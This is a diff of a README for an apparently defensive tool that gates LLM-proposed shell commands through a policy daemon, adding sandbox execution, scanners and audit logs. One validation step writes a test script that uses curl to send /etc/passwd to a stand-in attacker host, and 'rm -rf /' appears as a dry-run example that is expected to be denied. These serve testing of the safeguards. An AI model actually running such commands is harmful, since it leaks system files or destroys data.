@@ -1,13 +1,13 @@
-# Heimdall M2
+# Heimdall M3
 
 Heimdall proposes one command at a time, checks it with a policy daemon, and
-runs approved commands in direct mode. The daemon never executes commands;
-the client uses the privileges of the user who started it. The client never
-reads `safety.yaml` or the daemon's HMAC secret.
+runs approved commands either directly or in a local `bwrap` sandbox. The daemon
+never executes commands; the client uses the privileges of the user who started
+it. The client never reads `safety.yaml` or the daemon's HMAC secret.
 
-M2 includes the client, confirmation flow, direct execution, and an LLM loop.
-Sandbox execution, scanners, rate limiting, session files, and the installer
-remain later milestones. Commands requiring a sandbox stop before execution.
+M3 includes the client, confirmation flow, direct execution, sandbox execution,
+static scanner hooks, execution audit records, and an LLM loop. Rate limiting,
+session files, systemd units, and the installer remain later milestones.
 
 ## Windows development
 
@@ -25,12 +25,14 @@ python heimdall.py ping
 python heimdall.py mode show --ascii --no-color
 python heimdall.py --cmd "ls -la" --dry-run
 python heimdall.py --cmd "nmap 127.0.0.1" --dry-run
+python heimdall.py --cmd "python3 script.py" --dry-run
 python heimdall.py --cmd "rm -rf /" --dry-run
 ```
 
 The nmap preview requests the typed phrase; root deletion is denied. Dry-run
-exercises confirmation and daemon approval but never launches a command. A goal
-dry-run stops after its first proposal without reporting simulated success.
+exercises confirmation, scanner metadata, and daemon approval but never launches
+a command. A goal dry-run stops after its first proposal without reporting
+simulated success.
 
 Windows defaults to dry-run. `--execute-on-windows` opts into direct execution
 of available native tools; Linux tools typically are not installed on Windows.
@@ -49,11 +51,11 @@ Stop the old daemon with Ctrl+C. From your existing Desktop checkout:
 ```bash
 cd ~/Desktop/heimdall
 git pull --ff-only
-sudo apt install python3-yaml
+sudo apt install python3-yaml bubblewrap shellcheck bandit ruff
 python3 -m unittest discover -s tests
 
 sudo install -d -o root -g root -m 0755 /opt/heimdall
-sudo install -o root -g root -m 0755 heimdald.py heimdall.py /opt/heimdall/
+sudo install -o root -g root -m 0755 heimdald.py heimdall.py executor.py scanners.py /opt/heimdall/
 sudo install -o root -g root -m 0600 safety.yaml /opt/heimdall/safety.yaml
 sudo ln -sfn /opt/heimdall/heimdall.py /usr/local/bin/heimdall
 
@@ -73,13 +75,33 @@ heimdall mode show
 heimdall --cmd "cat /etc/hostname"
 heimdall --cmd "systemctl status sshd" --dry-run
 heimdall --cmd "nmap -sn 127.0.0.1" --dry-run
-heimdall --cmd "python3 script.py"
+heimdall --cmd "python3 script.py" --dry-run
 ```
 
 Expected: ping succeeds, hostname prints, service and scan previews ask for
-`I UNDERSTAND THE RISK`, and Python execution stops because it requires a
-sandbox. The client does not elevate privileges. `sudo` wrappers are not mapped.
-`newgrp` starts a subshell; `exit` leaves it.
+`I UNDERSTAND THE RISK`, and Python dry-run shows sandbox mode with scanner
+metadata. The client does not elevate privileges. `sudo` wrappers are not
+mapped. `newgrp` starts a subshell; `exit` leaves it.
+
+To validate M3 sandbox and scanner behavior on Kali:
+
+```bash
+printf 'print("hi")\n' > /tmp/hello.py
+heimdall --cmd "python3 /tmp/hello.py"
+
+cat > /tmp/evil.py <<'EOF'
+import subprocess
+subprocess.run(["curl", "http://evil.example/", "-d", "@/etc/passwd"])
+EOF
+heimdall --cmd "python3 /tmp/evil.py"
+
+sudo tail -5 /var/lib/heimdall/history/$(date -u +%Y-%m-%d).jsonl | python3 -m json.tool
+```
+
+Expected: a normal Python script is evaluated under sandbox mode, malicious
+Python is blocked before execution when Bandit reports a high-severity finding
+and `block_on_scan_fail` is enabled, and the history shows verdict plus
+`exec_start`/`exec_end` records for executed commands.
 
 Production requires root for the daemon and a private root-owned policy. Its
 socket is `/run/heimdall/bifrost.sock`, mode 0660. `--socket-group heimdall` sets
@@ -89,7 +111,7 @@ A systemd service is not supplied yet.
 For Linux development, start `python3 heimdald.py --dev` and use
 `python3 heimdall.py --dev ping`. Linux production does not fall back to a
 development endpoint when its socket is missing. Restart the daemon after
-updating to M2 so the confirmation contract is available.
+updating so the latest verdict contract is available.
 
 ## Local LLM
 
@@ -114,7 +136,7 @@ at `http://127.0.0.1:11434/v1/chat/completions` and `qwen2.5-coder:7b`.
 No SDK or API key is needed for that local endpoint.
 
 Use `--llm-url` / `--llm-model`, or `HEIMDALL_LLM_URL` /
-`HEIMDALL_LLM_MODEL`, for another compatible server. M2 does not add API-key
+`HEIMDALL_LLM_MODEL`, for another compatible server. M3 does not add API-key
 authentication. The configured server receives your goal, executed commands,
 and the last 2,000 characters of each output stream.
 
@@ -155,11 +177,13 @@ and a token. Confirmation cannot override denial. Final decisions and approval
 are logged before returning; audit failures deny in both dev and production.
 
 The client requires `ALLOW`, a token bound to the exact command and mode, and
-resolved mode `direct` before execution. It checks public hash and mode fields;
-it cannot independently verify the HMAC signature and trusts the configured
-daemon. Tokens have no expiry or replay protection and are not standalone
-security capabilities. Confirmation records the client's assertion of approval,
-not proof that a human was present.
+resolved mode `direct` or `sandbox` before execution. It checks public hash and
+mode fields; it cannot independently verify the HMAC signature and trusts the
+configured daemon. Tokens have no expiry or replay protection and are not
+standalone security capabilities. Confirmation records the client's assertion of
+approval, not proof that a human was present. Before execution, the client sends
+token-bound `exec_start`; after execution it sends `exec_end` with return code,
+duration, output hashes, and whether `bwrap` was used.
 
 `ping`, `mode_show`, and root-only production `mode_set` remain supported.
 Request mode overrides are rejected. Exit codes: 1 connection/LLM error,
@@ -175,13 +199,16 @@ subcommands and options before subcommands fail closed. Classification does not
 validate arbitrary script contents, executable provenance, or every argument.
 Direct execution is not an isolation boundary.
 
-Lab environment checks, scanners, policy rate limits, and confirmation timeouts
-are not enforced yet. M2 refuses to execute sandbox-required commands; M3 will
-implement the sandbox. History is hash-chained JSONL, but it cannot protect
-against an attacker rewriting the complete log. It records decisions and
-confirmation, not command completion or persistent client sessions.
+Lab environment checks, policy rate limits, confirmation timeouts, and systemd
+units are not enforced yet. Sandbox execution depends on Bubblewrap being
+installed and available as `bwrap`. Missing scanners are reported and skipped;
+blocking happens only when a configured scanner runs and reports a high-severity
+finding. History is hash-chained JSONL, but it cannot protect against an
+attacker rewriting the complete log.
 
 M1 was validated on Windows and Kali, including root production mode and a live
 Unix-socket ping. M2 automated tests cover daemon confirmation, execution gates,
 timeouts, bounded output, socket protocol, CLI previews, and an HTTP mock LLM
-loop. A real Ollama model and Kali M2 execution still need validation.
+loop. M3 automated tests cover sandbox and scanner metadata, token-bound
+execution audit ops, and the updated client execution path. Real Kali `bwrap`
+and scanner execution still need validation after deployment.
